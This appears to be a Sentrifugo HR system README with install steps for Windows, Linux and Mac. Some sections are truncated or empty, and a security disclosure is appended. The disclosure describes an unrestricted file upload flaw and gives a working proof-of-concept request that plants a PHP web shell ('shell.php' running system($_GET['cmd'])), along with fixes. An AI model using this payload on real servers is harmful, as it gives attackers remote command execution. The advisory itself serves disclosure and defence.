# Sentrifugo

Sentrifugo is a free and powerful new-age Human Resource Management System that can be easily configured to adapt to your organizational processes.

# Installing Sentrifugo Version 3.1.1

Sentrifugo comes with its own web-installer to help guide you through the installation process.

Note: You can also find these steps in <http://www.sentrifugo.com/home/installationguide>

Table of Contents:

1. What server Sentrifugo works on?
2. Windows installation Guide
3. Linux installation Guide
4. MAC installation Guide
5. Upgrading your application code with patches

   1. What server does Sentrifugo work on?
      =======================================
      Sentrifugo works only on Apache Server
   2. ## Windows Installation Guide ============================= AMP stack for Windows

      * The recommended AMP stack for Windows is XAMPP (Download the installer from basic package)
      * The system installer for XAMPP will guide you through the installation process
      ## Copying files

      * Move Sentrifugo zip file into the document root of Apache HTTP server.
      * If you used XAMPP for windows, document root is \htdocs\
      * For example: C:\xampp\htdocs\
      ## Extracting

      * Extract the Sentrifugo zip file in the document root of Apache HTTP server
      ## Web Installer

      * XAMPP users; the AMP stack for Windows needs to be started manually.
      * Using a JavaScript enabled browser go to http:///sentrifugo/; Where is localhost if it is installed in the machine you are
        currently working on, IP address if it is remotely hosted
      ## Pre-requisites

      The system requirements for installing Sentrifugo are described below. Make sure your system meets these requirements.

      a. PHP 5.3 or later
      You can download PHP 5.3 or later by visiting <http://windows.php.net/download/>

      b. PDO MySQL (for MySQL connection)
      To install Sentrifugo on windows, you need to enable the PDO and PDO\_MYSQL extensions in your php.ini file. You can add the following
      lines in your php.ini file:

      ```
       1. extension=php_pdo.dll
       2. extension=php_pdo_mysql.dll

      ```

      c. Rewrite module (for working of MVC architecture)
      To activate the module, the following line in httpd.conf needs to be uncommented:

      ```
       1. LoadModule rewrite_module modules/mod_rewrite.so
       To see whether it is already active, try putting a .htaccess file into a web directory containing the line

       2. RewriteEngine on
       If this works without throwing a 500 internal server error, and the .htaccess file gets parsed, URL rewriting works.

       You also need to make sure that in your httpd.conf, AllowOverrides is enabled:

       3. AllowOverride all
       This is important as many httpd.conf ship by default with allowoverride none

      ```

      d. GD library (for images)
      You can add the following lines in your php.ini file:

      ```
       1. extension = php_gd2.dll

      ```

      e. Open SSL (For SSL and TSL Protocols)
      Download the installer for OpenSSL 1.0.1e from <http://www.openssl.org/related/binaries.html>

      ```
       If OpenSSL is already installed in your system, to enable this extension in your php.ini file, you can add the following line in your php.ini
       file:

       1. extension=php_openssl.dll

      ```
   3. ## Linux Installation Guide =========================== AMP stack for Linux

      * The recommended AMP stack for Linux is XAMPP Linux 1.6 (Download the complete stack and not the upgrades)
      * The system installer for XAMPP in the XAMPP site will guide you through the installation process
      * Start the stack manually every time you reboot.
      * Change the ownership of Sentrifugo files (Ex: /opt/xampp/htdocs/sentrifugo/ $ chown -R nobody.nobody)
      ## Copying files

      * Move Sentrifugo zip file into the document root of Apache HTTP server.
      * If you used XAMPP for windows, document root is \htdocs\
      * For example: C:\xampp\htdocs\
      ## Extracting

      * Extract the Sentrifugo zip file in the document root of Apache HTTP server
      ## Web Installer

      * XAMPP users; the AMP stack for Linux needs to be started manually.
      * Using a JavaScript enabled browser go to http:///sentrifugo/; Where is localhost if it is installed in the machine you are
        currently working on, IP address if it is remotely hosted
      ## Pre-requisites

      The system requirements for installing Sentrifugo are described below. Make sure your system meets these requirements.

      a. PHP 5.3 or later
      To install PHP 5.3 on Linux, please follow the below links:

      ```

       For Redhat and CentOS: http://www.thetechnicalstuff.com/install-php5-3-in-centos-and-redhat/

      ```

      b. PDO MySQL (for MySQL connection)
      To install Sentrifugo on Linux, you can compile php with --with-pdo-mysql in your php.ini, and add the following lines:

      ```
       1. extension=pdo.so
       2. extension=pdo_mysql.so

      ```

      c. Rewrite module (for working of MVC architecture)
      activate mod\_rewrite in linux, open the terminal and add the below line:

      ```
       1. sudo a2enmod rewrite

       You also need to make sure that in your httpd.conf, AllowOverride is enabled:
       2. AllowOverride All

      ```

      d. GD library (for images)
      To install GD library in Linux, open the terminal and add the below lines:

      ```

      e. Open SSL (For SSL and TSL Protocols)
      Download the OpenSSL 1.0.1c tarball archive from the OpenSSL web site at <http://www.openssl.org/source/>
   4. ## MAC Installation Guide ========================= AMP stack for MAC

      * The recommended AMP stack for MAC is MAMP
      * The system installer for XAMPP will guide you through the installation process
      * If MAMP is previously installed, the installer will rename the MAMP folder to MAMP\_current\_date.
      * An existing folder will be moved to your new /Applications/MAMP folder.
      * Your /Applications/MAMP\_current\_date folder can now be deleted. You can keep it if you wish to fall back to your original setup.
      ## Copying files

      * Move Sentrifugo zip file into the document root of Apache HTTP server.
      * If you used XAMPP for windows, document root is \htdocs\
      * For example: C:\xampp\htdocs\
      ## Extracting

      * Extract the Sentrifugo zip file in the document root of Apache HTTP server
      ## Web Installer

      * MAMP users; the AMP stack for MAC needs to be started manually.
      * Using a JavaScript enabled browser go to http:///sentrifugo/; Where is localhost if it is installed in the machine you are
        currently working on, IP address if it is remotely hosted
      ## Pre-requisites

       1. extension=php_mysqli.so
       2. extension=php_pdo_mysql.so

      ```

      c. Rewrite module (for working of MVC architecture)
      To activate mod\_rewrite module in MAC, add the below line to httpd.conf file

      ```
       1. LoadModule rewrite_module libexec/apache2/mod_rewrite.so
       2. LoadModule php5_module libexec/apache2/libphp5.so

| Bug: Authenticated - Unrestricted file uploadDescription The `AssetsController::uploadsaveAction` function allows an authenticated attacker to upload any file without extension filtering. Vulnerability Detail The `uploadsaveAction` function allows an attacker to take full control of the extension and save it to `ASSETS_IMAGES_TEMP_PATH`  ``` /* /application/modules/assets/controllers/AssetsController.php */ public function uploadsaveAction() 	{ 			 		$assetsModel = new Assets_Model_Assets(); 		$user_id = sapp_Global::_readSession('id'); 		$image;         $filedata = array();     	// Validate file with size greater than default(Upload Max Filesize)limit         if ($_FILES["myfile"]["size"] == 0 || $_FILES["myfile"]["size"] > (2*1024*1024))  			{ 				$this->_helper->json(array('error' => 'filesize')); 			} 		else if(isset($_FILES["myfile"])) {             $fileName = $_FILES["myfile"]["name"]; 			$image = $fileName;             $fileName = preg_replace('/[^a-zA-Z0-9.\']/', '_', $fileName);			  	             $newName  = time().'_'.$user_id.'_'.str_replace(' ', '_', $fileName);              $filedata['original_name'] = $fileName;             $filedata['new_name'] = $newName; 			$file_type_array = explode('.',$filedata['original_name']); 			$file_type = $file_type_array[1]; 			 			 			move_uploaded_file($_FILES["myfile"]["tmp_name"],ASSETS_IMAGES_TEMP_PATH.$newName);       ... ``` Proof of concept REQUEST:  ``` POST /sentrifugo/index.php/assets/assets/uploadsave HTTP/2 Host: localhost:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0 Cookie: PHPSESSID=4c6885df75ee21adc859130d344ad10e Content-Type: multipart/form-data; boundary=---------------------------105724483522942151783772139738 Content-Length: 256   -----------------------------105724483522942151783772139738 Content-Disposition: form-data; name="myfile"; filename="shell.php" Content-Type: image/jpeg  <?php 	system($_GET["cmd"]); ?> -----------------------------105724483522942151783772139738--   ```  RESPONSE:  ``` HTTP/1.1 200 OK Date: Wed, 08 Mar 2023 06:41:21 GMT Server: Apache/2.2.29 (Unix) mod_wsgi/3.5 Python/2.7.10 PHP/5.6.10 mod_ssl/2.2.29 OpenSSL/0.9.8zh DAV/2 mod_fastcgi/2.4.6 mod_perl/2.0.9 Perl/v5.22.0 X-Powered-By: PHP/5.6.10 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 78 Connection: close Content-Type: text/html;charset=UTF-8  {"filedata":{"original_name":"shell.php","new_name":"1678257682_1_shell.php"}}  ```  [image-20230308134229160](https://user-images.githubusercontent.com/44127534/223641245-2f675c96-9dcc-443f-aede-8519ead8ff6a.png) [image-20230308134249938](https://user-images.githubusercontent.com/44127534/223641333-12223a68-fafa-4238-a3bb-ccfbf8f5377d.png) Solution  * Validate file type: Ensure that the uploaded file matches the expected file type and size limit. This can be done by checking the file extension or using a file type validation library. * Sanitize file names: Ensure that the file names are sanitized to prevent directory traversal attacks. This involves removing any special characters, whitespace, and other potentially harmful characters. * Store files outside the webroot: Store uploaded files outside of the web application's root directory to prevent them from being executed as scripts.. * Implement access controls: Implement access controls to ensure that only authorized users can upload files. This can include requiring authentication, setting permissions, and limiting upload privileges.  Acknowledgement nhienit at bl4ckh0l3 from Galaxy One |
